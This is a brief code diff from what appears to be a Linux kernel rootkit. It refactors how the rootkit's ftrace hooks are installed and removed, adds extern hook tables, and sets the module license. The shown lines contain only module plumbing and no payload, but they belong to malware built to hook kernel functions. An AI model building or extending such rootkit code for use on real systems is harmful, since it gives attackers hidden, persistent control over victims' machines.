@@ -9,8 +9,12 @@
 #include "ftrace_hook.h"
 #include "inline_hook.h"
 #include <linux/slab.h>
+#include <linux/module.h>
 
 static int module_state[MODULE_MAX];
+
+extern struct fh_hook fh_hooks[];
+extern size_t fh_hook_count;
 
 void enable_module(enum rk_module_id id) {
     if (id >= MODULE_MAX)
@@ -21,7 +25,7 @@ void enable_module(enum rk_module_id id) {
 
     switch (id) {
         case MODULE_FTRACE:
-            fh_install_hooks();
+            fh_install_hooks(fh_hooks, fh_hook_count);
             break;
         case MODULE_INLINE_HOOK:
             setup_inline_hooks();
@@ -60,7 +64,7 @@ void disable_module(enum rk_module_id id) {
 
     switch (id) {
         case MODULE_FTRACE:
-            fh_remove_hooks();
+            fh_remove_hooks(fh_hooks, fh_hook_count);
             break;
         case MODULE_INLINE_HOOK:
             remove_inline_hooks();
@@ -140,3 +144,5 @@ void rootkit_core_exit(void) {
     for (i = 0; i < MODULE_MAX; i++)
         disable_module(i);
 }
+
+MODULE_LICENSE("GPL");
